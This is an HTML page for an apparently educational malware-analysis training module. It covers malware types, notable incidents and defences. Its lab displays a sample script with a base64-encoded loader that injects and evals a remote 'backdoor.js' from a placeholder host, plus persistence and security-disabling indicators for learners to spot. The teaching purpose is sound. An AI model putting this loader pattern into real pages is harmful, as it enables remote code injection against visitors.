<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Malware Analysis Module - Project Lyra</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="../styles/module-styles.css">
<link rel="stylesheet" href="../styles/phishing-module.css"> <!-- Reusing for general module styling -->
</head>
<body>
<div class="main-container">
  <div class="content-wrapper">
      <header class="module-header">
          <i class="fas fa-bug module-icon"></i>
          <h1 class="glitch-text" data-text="Malware Analysis">Malware Analysis</h1>
          <p class="module-description">Learn to dissect, understand, and combat malicious software.</p>
          <div class="module-stats">
              <div class="stat-item">
                  <span class="stat-number" id="progress-percentage">0%</span>
                  <span class="stat-label">Module Progress</span>
              </div>
              <div class="stat-item">
                  <span class="stat-number" id="samples-analyzed">0/5</span>
                  <span class="stat-label">Samples Analyzed</span>
              </div>
              <div class="stat-item">
                  <span class="stat-number" id="indicators-found">0/5</span>
                  <span class="stat-label">Indicators Found</span>
              </div>
          </div>
      </header>

      <section id="introduction" class="lesson-section" data-section="introduction">
          <h2><i class="fas fa-info-circle"></i> Understanding Malware</h2>
          <div class="intro-content">
              <div class="intro-text">
                  <p>Malware, short for malicious software, is any software intentionally designed to cause damage to a computer, server, client, or computer network, or to "take over" operation of a computer. It can steal data, encrypt files, or disrupt operations.</p>
              </div>
              <div class="concept-grid">
                  <div class="concept-card" data-concept="harmful-intent">
                      <i class="fas fa-skull-crossbones"></i>
                      <h3>Harmful Intent</h3>
                      <p>Malware is created with the explicit purpose of causing harm or unauthorized access.</p>
                  </div>
                  <div class="concept-card" data-concept="diverse-forms">
                      <i class="fas fa-network-wired"></i>
                      <h3>Diverse Forms</h3>
                      <p>It encompasses a wide range of threats, from viruses to ransomware and spyware.</p>
                  </div>
                  <div class="concept-card" data-concept="constant-evolution">
                      <i class="fas fa-shield-alt"></i>
                      <h3>Constant Evolution</h3>
                      <p>Attackers continuously develop new malware to bypass security measures.</p>
                  </div>
              </div>
          </div>
      </section>

      <section id="malware-types" class="lesson-section" data-section="malware-types">
          <h2><i class="fas fa-viruses"></i> Common Malware Types</h2>
          <div class="vectors-grid">
              <div class="vector-card" data-vector="viruses">
                  <div class="vector-header">
                      <i class="fas fa-virus"></i>
                      <h3>Viruses</h3>
                      <span class="threat-level critical">Critical</span>
                  </div>
                  <div class="vector-content">
                      <p>Self-replicating programs that attach themselves to legitimate programs or documents and spread when those programs are executed.</p>
                      <div class="red-flags">
                          <h4>Characteristics:</h4>
                          <ul>
                              <li>Requires host program to spread</li>
                              <li>Can corrupt files or data</li>
                              <li>Often spread via downloads or email attachments</li>
                          </ul>
                      </div>
                  </div>
              </div>
              <div class="vector-card" data-vector="worms">
                  <div class="vector-header">
                      <i class="fas fa-worm"></i>
                      <h3>Worms</h3>
                      <span class="threat-level high">High</span>
                  </div>
                  <div class="vector-content">
                      <p>Self-replicating malware that spreads across networks without needing a host program or human interaction.</p>
                      <div class="red-flags">
                          <h4>Characteristics:</h4>
                          <ul>
                              <li>Independent, self-propagating</li>
                              <li>Exploits network vulnerabilities</li>
                              <li>Can consume bandwidth, crash systems</li>
                          </ul>
                      </div>
                  </div>
              </div>
              <div class="vector-card" data-vector="trojans">
                  <div class="vector-header">
                      <i class="fas fa-horse-head"></i>
                      <h3>Trojans</h3>
                      <span class="threat-level medium">Medium</span>
                  </div>
                  <div class="vector-content">
                      <p>Malware disguised as legitimate software. Users are tricked into installing them, after which they perform malicious actions.</p>
                      <div class="red-flags">
                          <h4>Characteristics:</h4>
                          <ul>
                              <li>Relies on user deception</li>
                              <li>Can create backdoors, steal data</li>
                              <li>Does not self-replicate</li>
                          </ul>
                      </div>
                  </div>
              </div>
              <div class="vector-card" data-vector="ransomware">
                  <div class="vector-header">
                      <i class="fas fa-file-invoice-dollar"></i>
                      <h3>Ransomware</h3>
                      <span class="threat-level critical">Critical</span>
                  </div>
                  <div class="vector-content">
                      <p>Encrypts a victim's files and demands a ransom payment, typically in cryptocurrency, for decryption.</p>
                      <div class="red-flags">
                          <h4>Characteristics:</h4>
                          <ul>
                              <li>Data encryption</li>
                              <li>Demands payment for decryption key</li>
                              <li>Often spread via phishing or exploit kits</li>
                          </ul>
                      </div>
                  </div>
              </div>
              <div class="vector-card" data-vector="spyware">
                  <div class="vector-header">
                      <i class="fas fa-user-secret"></i>
                      <h3>Spyware</h3>
                      <span class="threat-level high">High</span>
                  </div>
                  <div class="vector-content">
                      <p>Secretly observes the user's activities without their permission, collecting personal information, browsing habits, and credentials.</p>
                      <div class="red-flags">
                          <h4>Characteristics:</h4>
                          <ul>
                              <li>Monitors user activity</li>
                              <li>Collects sensitive data</li>
                              <li>Can be bundled with legitimate software</li>
                          </ul>
                      </div>
                  </div>
              </div>
          </div>
      </section>

      <section id="real-world-cases" class="lesson-section" data-section="real-world-cases">
          <h2><i class="fas fa-history"></i> Notable Malware Incidents</h2>
          <div class="cases-timeline">
              <div class="case-item" data-case="wannacry">
                  <span class="case-year">2017</span>
                  <div class="case-header">
                      <i class="fas fa-lock"></i>
                      <h3>WannaCry Ransomware Attack</h3>
                      <span class="impact-badge severe">Severe</span>
                  </div>
                  <div class="case-content">
                      <p>A global ransomware cyberattack that targeted computers running Microsoft Windows by encrypting data and demanding ransom payments in Bitcoin. It exploited a vulnerability in older Windows systems.</p>
                      <div class="case-lessons">
                          <strong>Lessons Learned:</strong>
                          <ul>
                              <li>Importance of timely software updates.</li>
                              <li>Impact of unpatched vulnerabilities.</li>
                              <li>Ransomware's rapid global spread.</li>
                          </ul>
                      </div>
                      <a href="https://en.wikipedia.org/wiki/WannaCry_ransomware_attack" target="_blank" class="case-link">Read More <i class="fas fa-external-link-alt"></i></a>
                  </div>
              </div>
              <div class="case-item" data-case="stuxnet">
                  <span class="case-year">2010</span>
                  <div class="case-header">
                      <i class="fas fa-industry"></i>
                      <h3>Stuxnet Worm</h3>
                      <span class="impact-badge critical">Critical</span>
                  </div>
                  <div class="case-content">
                      <p>A sophisticated malicious computer worm that targeted industrial control systems (ICS), specifically Siemens PLCs, used to enrich uranium in Iran's nuclear program. It was one of the first known cyberweapons.</p>
                      <div class="case-lessons">
                          <strong>Lessons Learned:</strong>
                          <ul>
                              <li>State-sponsored cyber warfare capabilities.</li>
                              <li>Vulnerability of critical infrastructure.</li>
                              <li>Advanced persistent threats (APTs).</li>
                          </ul>
                      </div>
                      <a href="https://en.wikipedia.org/wiki/Stuxnet" target="_blank" class="case-link">Read More <i class="fas fa-external-link-alt"></i></a>
                  </div>
              </div>
              <div class="case-item" data-case="notpetya">
                  <span class="case-year">2017</span>
                  <div class="case-header">
                      <i class="fas fa-eraser"></i>
                      <h3>NotPetya Cyberattack</h3>
                      <span class="impact-badge severe">Severe</span>
                  </div>
                  <div class="case-content">
                      <p>Initially disguised as ransomware, NotPetya was a destructive wiper malware that caused widespread damage to Ukrainian organizations and global companies. It permanently destroyed data rather than encrypting it for ransom.</p>
                      <div class="case-lessons">
                          <strong>Lessons Learned:</strong>
                          <ul>
                              <li>Malware can be disguised.</li>
                              <li>Devastating impact of wiper attacks.</li>
                              <li>Supply chain attacks are effective.</li>
                          </ul>
                      </div>
                      <a href="https://en.wikipedia.org/wiki/NotPetya" target="_blank" class="case-link">Read More <i class="fas fa-external-link-alt"></i></a>
                  </div>
              </div>
          </div>
      </section>

      <section id="analysis-lab" class="lesson-section" data-section="analysis-lab">
          <h2><i class="fas fa-microscope"></i> Malware Signature Analysis</h2>
          <p class="analysis-briefing">
              <strong>Mission Briefing:</strong> You've intercepted a suspicious code snippet. Your task is to analyze it for common malware signatures and indicators.
          </p>
          <div class="analysis-container">
              <div class="intercepted-email"> <!-- Reusing email styling for code block -->
                  <div class="email-metadata">
                      <div class="metadata-row"><strong>File:</strong> <span class="static-element">suspicious_script.js</span></div>
                      <div class="metadata-row"><strong>Type:</strong> <span class="static-element">JavaScript</span></div>
                      <div class="metadata-row"><strong>Size:</strong> <span class="static-element">1.2 KB</span></div>
                  </div>
                  <hr class="email-hr-separator">
                  <div class="email-body"> <!-- Reusing email body for code content -->
                      <pre class="code-snippet-pre"><code>
function executePayload() {
    const encodedData = "dmFyIGEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsNCmEuc3JjPSJodHRwczovL21hbGljaW91cy5jb20vYmFja2Rvb3IuanMiOw0KZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=";
    const decodedData = <span class="threat-indicator" data-threat="base64">atob(encodedData)</span>; // Base64 decoding
    <span class="threat-indicator" data-threat="eval">eval(decodedData)</span>; // Execution of decoded data

    // Attempt to disable security features
    if (window.firewall) {
        <span class="threat-indicator" data-threat="disable-security">window.firewall.disable()</span>;
    }
    if (navigator.userAgent.includes("Windows")) {
        // Common path for persistence
        const regKey = <span class="threat-indicator" data-threat="registry">"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span>;
        console.log("Attempting to modify registry key:", regKey);
    }
}

// Obfuscated call
<span class="threat-indicator" data-threat="delayed-execution">setTimeout(function() { executePayload(); }, 5000)</span>;
                      </code></pre>
                  </div>
                  <div class="email-footer">
                      <p>This snippet was found embedded in a seemingly harmless web page.</p>
                  </div>
              </div>
              <div class="threat-analysis">
                  <h4>Analysis Findings Log</h4>
                  <div class="findings-list">
                      <p class="no-findings">Click on suspicious code elements to identify malware indicators:</p>
                      <div id="threat-findings"></div>
                  </div>
                  <div class="analysis-score">
                      <div class="score-header">Analysis Progress</div>
                      <div class="score-content">
                          <div class="score-circle">
                              <span id="found-indicators">0</span>/<span>5</span>
                          </div>
                          <div class="progress-container">
                              <div class="progress-bar" id="analysis-progress" style="width: 0%;"></div>
                          </div>
                          <p class="score-message" id="analysis-message">Start identifying indicators!</p>
                      </div>
                  </div>
              </div>
          </div>
      </section>

      <section id="defense-strategies" class="lesson-section" data-section="defense-strategies">
          <h2><i class="fas fa-shield-alt"></i> Defense Strategies</h2>
          <div class="defense-grid">
              <div class="defense-category">
                  <h3><i class="fas fa-eye"></i> Prevention & Best Practices</h3>
                  <div class="defense-items">
                      <div class="defense-item" data-defense="updates">
                          <i class="fas fa-sync-alt"></i>
                          <div class="defense-content">
                              <h4>Keep Software Updated</h4>
                              <p>Regularly update your operating system, web browsers, and all software to patch known vulnerabilities that malware exploits.</p>
                          </div>
                      </div>
                      <div class="defense-item" data-defense="passwords">
                          <i class="fas fa-lock"></i>
                          <div class="defense-content">
                              <h4>Use Strong Passwords & MFA</h4>
                              <p>Combine complex, unique passwords with Multi-Factor Authentication to secure accounts, even if credentials are stolen.</p>
                          </div>
                      </div>
                      <div class="defense-item" data-defense="trusted-sources">
                          <i class="fas fa-download"></i>
                          <div class="defense-content">
                              <h4>Download from Trusted Sources</h4>
                              <p>Only download software and files from official, reputable websites and app stores to avoid bundled malware.</p>
                          </div>
                      </div>
                  </div>
              </div>
              <div class="defense-category">
                  <h3><i class="fas fa-tools"></i> Technical Safeguards</h3>
                  <div class="defense-items">
                      <div class="defense-item" data-defense="antivirus">
                          <i class="fas fa-shield-virus"></i>
                          <div class="defense-content">
                              <h4>Install Antivirus/Anti-Malware</h4>
                              <p>Use reputable security software and keep its definitions updated for real-time protection and regular scans.</p>
                          </div>
                      </div>
                      <div class="defense-item" data-defense="backups">
                          <i class="fas fa-cloud-upload-alt"></i>
                          <div class="defense-content">
                              <h4>Regular Data Backups</h4>
                              <p>Maintain frequent backups of important data to an external or cloud storage, protecting against ransomware and data loss.</p>
                          </div>
                      </div>
                      <div class="defense-item" data-defense="firewalls">
                          <i class="fas fa-firewall"></i>
                          <div class="defense-content">
                              <h4>Enable Firewalls</h4>
                              <p>Configure and enable network firewalls to monitor and control incoming and outgoing network traffic, blocking suspicious connections.</p>
                          </div>
                      </div>
                  </div>
              </div>
          </div>
      </section>

      <section id="training-redirect" class="lesson-section" data-section="training-redirect">
          <h2><i class="fas fa-laptop-code"></i> Ready to Analyze?</h2>
          <p class="redirect-description">Deepen your understanding with practical exercises!</p>
          <div class="redirect-actions">
              <a href="../dashboard.html" class="redirect-btn">Return to Dashboard <i class="fas fa-arrow-right"></i></a>
          </div>
      </section>
  </div>
</div>

<script src="../../auth.js"></script>
<script>
  let moduleProgress = {
    sectionsVisited: new Set(),
    conceptsViewed: new Set(),
    vectorsExplored: new Set(),
    casesStudied: new Set(),
    indicatorsFound: new Set(),
    defensesLearned: new Set(),
    startTime: Date.now(),
    totalSections: 6,
    totalIndicators: 5
  };

  let indicatorDefinitions = {
    'base64': 'Base64 Encoding (atob): Often used to hide malicious strings from static analysis.',
    'eval': 'Dynamic Code Execution (eval): Allows execution of arbitrary code, a major security risk.',
    'disable-security': 'Disabling Security: Attempts to disable firewall or antivirus protection.',
    'registry': 'Persistence Mechanism: Modifying registry run keys for automatic startup.',
    'delayed-execution': 'Obfuscated Execution: Delays execution to evade detection systems.'
  };

  document.addEventListener('DOMContentLoaded', async function() {
    // Check authentication
    const token = window.LyraAuth.getToken();
    if (!token) {
      window.location.href = '../../index.html';
      return;
    }

    await window.LyraAuth.trackUserActivity('module_start', {
      module: 'malware-analysis',
      timestamp: new Date().toISOString()
    });

    setupProgressTracking();
    setupThreatAnalysis();
    updateProgressDisplay();
  });

  function setupProgressTracking() {
    // Track section visibility
    const observer = new IntersectionObserver((entries) => {
      entries.forEach(entry => {
        if (entry.isIntersecting) {
          const sectionId = entry.target.getAttribute('data-section');
          if (sectionId && !moduleProgress.sectionsVisited.has(sectionId)) {
            moduleProgress.sectionsVisited.add(sectionId);
            window.LyraAuth.trackUserActivity('section_viewed', {
              module: 'malware-analysis',
              section: sectionId,
              timestamp: new Date().toISOString()
            });
            updateProgressDisplay();
          }
        }
      });
    }, { threshold: 0.5 });

    document.querySelectorAll('.lesson-section').forEach(section => {
      observer.observe(section);
    });

    // Track concept card interactions
    document.querySelectorAll('.concept-card').forEach(card => {
      card.addEventListener('click', function() {
        const concept = this.getAttribute('data-concept');
        if (concept && !moduleProgress.conceptsViewed.has(concept)) {
          moduleProgress.conceptsViewed.add(concept);
          window.LyraAuth.trackUserActivity('concept_explored', {
            module: 'malware-analysis',
            concept: concept,
            timestamp: new Date().toISOString()
          });
        }
      });
    });

    // Track vector card interactions
    document.querySelectorAll('.vector-card').forEach(card => {
      card.addEventListener('click', function() {
        const vector = this.getAttribute('data-vector');
        if (vector && !moduleProgress.vectorsExplored.has(vector)) {
          moduleProgress.vectorsExplored.add(vector);
          window.LyraAuth.trackUserActivity('vector_explored', {
            module: 'malware-analysis',
            vector: vector,
            timestamp: new Date().toISOString()
          });
        }
      });
    });

    // Track case study interactions
    document.querySelectorAll('.case-item').forEach(item => {
      item.addEventListener('click', function() {
        const caseId = this.getAttribute('data-case');
        if (caseId && !moduleProgress.casesStudied.has(caseId)) {
          moduleProgress.casesStudied.add(caseId);
          window.LyraAuth.trackUserActivity('case_studied', {
            module: 'malware-analysis',
            case: caseId,
            timestamp: new Date().toISOString()
          });
        }
      });
    });

    // Track defense strategy interactions
    document.querySelectorAll('.defense-item').forEach(item => {
      item.addEventListener('click', function() {
        const defense = this.getAttribute('data-defense');
        if (defense && !moduleProgress.defensesLearned.has(defense)) {
          moduleProgress.defensesLearned.add(defense);
          window.LyraAuth.trackUserActivity('defense_learned', {
            module: 'malware-analysis',
            defense: defense,
            timestamp: new Date().toISOString()
          });
        }
      });
    });
  }

  function setupThreatAnalysis() {
    document.querySelectorAll('.threat-indicator').forEach(indicator => {
      indicator.addEventListener('click', function() {
        const indicatorType = this.getAttribute('data-threat');
        if (indicatorType && !moduleProgress.indicatorsFound.has(indicatorType)) {
          moduleProgress.indicatorsFound.add(indicatorType);
          
          // Add finding to the log
          const findingsContainer = document.getElementById('threat-findings');
          const findingElement = document.createElement('div');
          findingElement.className = 'finding-item severity-critical';
          findingElement.innerHTML = `<strong>🚩 Indicator ${moduleProgress.indicatorsFound.size}:</strong> ${indicatorDefinitions[indicatorType]}`;
          findingsContainer.appendChild(findingElement);

          // Update progress
          updateIndicatorAnalysisProgress();
          
          // Track the indicator identification
          window.LyraAuth.trackUserActivity('indicator_identified', {
            module: 'malware-analysis',
            indicator: indicatorType,
            totalFound: moduleProgress.indicatorsFound.size,
            timestamp: new Date().toISOString()
          });

          // Visual feedback
          this.style.backgroundColor = 'rgba(255, 0, 0, 0.2)';
          this.style.border = '1px solid #ff0000';
        }
      });
    });
  }

  function updateIndicatorAnalysisProgress() {
    const foundCount = moduleProgress.indicatorsFound.size;
    const totalCount = moduleProgress.totalIndicators;
    const percentage = (foundCount / totalCount) * 100;

    document.getElementById('found-indicators').textContent = foundCount;
    document.getElementById('analysis-progress').style.width = `${percentage}%`;
    
    const messageElement = document.getElementById('analysis-message');
    if (foundCount === 0) {
      messageElement.textContent = 'Start identifying indicators!';
    } else if (foundCount < totalCount) {
      messageElement.textContent = `Great work! ${totalCount - foundCount} more to find.`;
    } else {
      messageElement.textContent = 'All indicators identified!';
      window.LyraAuth.trackUserActivity('analysis_completed', {
        module: 'malware-analysis',
        timeToComplete: Date.now() - moduleProgress.startTime,
        timestamp: new Date().toISOString()
      });
    }

    updateProgressDisplay();
  }

  function updateProgressDisplay() {
    const sectionsProgress = (moduleProgress.sectionsVisited.size / moduleProgress.totalSections) * 100;
    const indicatorsProgress = (moduleProgress.indicatorsFound.size / moduleProgress.totalIndicators) * 100;
    const overallProgress = Math.round((sectionsProgress + indicatorsProgress) / 2);

    document.getElementById('progress-percentage').textContent = `${overallProgress}%`;
    document.getElementById('samples-analyzed').textContent = `${moduleProgress.casesStudied.size}/3`;
    document.getElementById('indicators-found').textContent = `${moduleProgress.indicatorsFound.size}/${moduleProgress.totalIndicators}`;
  }

  // Track time spent on page
  window.addEventListener('beforeunload', async function() {
    const timeSpent = Math.round((Date.now() - moduleProgress.startTime) / 1000);
    await window.LyraAuth.trackUserActivity('module_time_spent', {
      module: 'malware-analysis',
      seconds: timeSpent,
      sectionsVisited: moduleProgress.sectionsVisited.size,
      indicatorsFound: moduleProgress.indicatorsFound.size,
      timestamp: new Date().toISOString()
    });
  });
</script>
</body>
</html>
